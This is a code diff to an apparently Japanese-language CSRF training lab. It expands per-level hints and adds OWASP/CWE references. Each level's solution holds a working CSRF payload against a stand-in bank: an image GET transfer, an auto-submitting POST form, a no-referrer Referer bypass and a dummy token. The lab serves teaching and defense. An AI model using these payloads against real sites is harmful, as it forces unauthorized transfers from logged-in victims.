@@ -151,7 +151,11 @@ function run(level: Level, input: LabInput): AttackResult {
 const levels: Record<Level, LevelSpec> = {
   1: {
     defense: "防御なし。/transfer は GET でも実行される。",
-    hint: "被害者のブラウザが『自動で』銀行へリクエストを送る HTML は？ 画像の読み込みはクリック不要で発火します。",
+    hints: [
+      "「ソース」を読みましょう。/transfer は何を確認していますか？ 被害者のブラウザに『自動で』リクエストを送らせる方法は？",
+      "被害者のブラウザが『自動で』銀行へリクエストを送る HTML は？ 画像の読み込みはクリック不要で発火します。",
+      "`<img>` の `src` に、送金の URL（`to` と `amount` を付けた GET）を指定しましょう。",
+    ],
     solution:
       '`<img src="https://bank.example/transfer?to=attacker&amount=10000">` を入力。画像読み込みで GET が自動送信され、被害者の Cookie が付与されます。',
     code: `app.get("/transfer", (req, res) => {
@@ -160,7 +164,11 @@ const levels: Record<Level, LevelSpec> = {
   },
   2: {
     defense: "状態変更は POST のみ許可（GET を拒否）。",
-    hint: "GET は拒否されます。クリックなしで POST を送るには、自動送信するフォームを使います。",
+    hints: [
+      "Lv1 の手口は通りません。「ソース」で、サーバーが何を拒否しているか確認しましょう。",
+      "GET は拒否されます。クリックなしで POST を送るには、自動送信するフォームを使います。",
+      "`method=post` の `<form>` を用意し、`<script>` から `document.forms[0].submit()` を呼びましょう。",
+    ],
     solution:
       '自動送信フォームを入力:\n`<form action="https://bank.example/transfer" method="post"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`',
     code: `app.post("/transfer", (req, res) => {
@@ -169,7 +177,11 @@ const levels: Record<Level, LevelSpec> = {
   },
   3: {
     defense: "Referer を検証（ただし空の Referer は許可してしまう）。",
-    hint: "Referer が evil.example だと弾かれます。でも『Referer を送らない』ようにできれば…？",
+    hints: [
+      "Lv2 の手口は通りません。ソースを読み、サーバーが Referer をどう扱っているか確認しましょう。空の場合はどうなりますか？",
+      "Referer が evil.example だと弾かれます。でも『Referer を送らない』ようにできれば…？",
+      "`<meta name=\"referrer\" content=\"no-referrer\">` で、Referer ヘッダを送らないようにできます。",
+    ],
     solution:
       'ページ先頭に `<meta name="referrer" content="no-referrer">` を追加してから、Lv2 の自動送信フォームを置く。Referer が空になり、ゆるい検証を通過します。',
     code: `const ref = req.headers.referer || "";
@@ -178,7 +190,11 @@ if (ref !== "" && !ref.includes("bank.example")) return res.status(403);
   },
   4: {
     defense: "CSRF トークンを要求（ただし存在チェックのみで値を検証しない）。",
-    hint: "トークンが必要ですが…サーバは『あるかどうか』しか見ていないとしたら？",
+    hints: [
+      "Lv3 の手口は通りません。ソースを読み、トークンの『何』を検証しているか確認しましょう。",
+      "トークンが必要ですが…サーバは『あるかどうか』しか見ていないとしたら？",
+      "フォームに `csrf_token` という名前の欄を追加しましょう。値は何でも構いません。",
+    ],
     solution:
       '`<meta name="referrer" content="no-referrer">` ＋ 自動送信フォームに `<input name="csrf_token" value="x">` を追加。値は何でもよく、存在するだけで通ります。',
     code: `if (!req.body.csrf_token) return res.status(403); // 値を検証していない
@@ -186,7 +202,10 @@ transfer(session.user, req.body.to, req.body.amount);`,
   },
   5: {
     defense: "ランダムな同期トークンを検証し、Cookie を SameSite=Strict にする。",
-    hint: "正しいトークンはサーバだけが知っており、Cookie はクロスサイトでは送られません。これは正しい対策です。",
+    hints: [
+      "正しいトークンはサーバだけが知っており、Cookie はクロスサイトでは送られません。これは正しい対策です。",
+      "「ソース」と「解説」を読み、同期トークンと SameSite Cookie がそれぞれ何を防いでいるかを整理しましょう。",
+    ],
     solution:
       "このレベルは意図的に突破不可能です。攻撃者はセッション固有のランダムトークンを知り得ず、SameSite=Strict の Cookie もクロスサイトでは送信されないため、送金は認証されません。",
     code: `// 1) セッション毎のランダムトークンを発行し、値を厳密比較
@@ -207,7 +226,24 @@ export const csrfLab: Lab = {
     shortTitle: "CSRF",
     category: "セッション / リクエスト偽造",
     objective: "ログイン中の被害者に、攻撃者宛ての送金を気づかせず実行させる。",
-    summary: "悪性ページから被害者のセッションで銀行の送金リクエストを強制する。",  },
+    summary: "悪性ページから被害者のセッションで銀行の送金リクエストを強制する。",
+    standards: {
+      owasp: {
+        code: "A01:2021",
+        name: "Broken Access Control",
+        url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control",
+      },
+      cwe: [{ id: 352, name: "Cross-Site Request Forgery (CSRF)" }],
+    },
+    references: [
+      {
+        title: "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
+        url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+      },
+      { title: "PortSwigger Web Security Academy — CSRF", url: "https://portswigger.net/web-security/csrf" },
+      { title: "IPA 安全なウェブサイトの作り方", url: "https://www.ipa.go.jp/security/vuln/websecurity/" },
+    ],
+  },
   fields: [
     {
       name: "html",
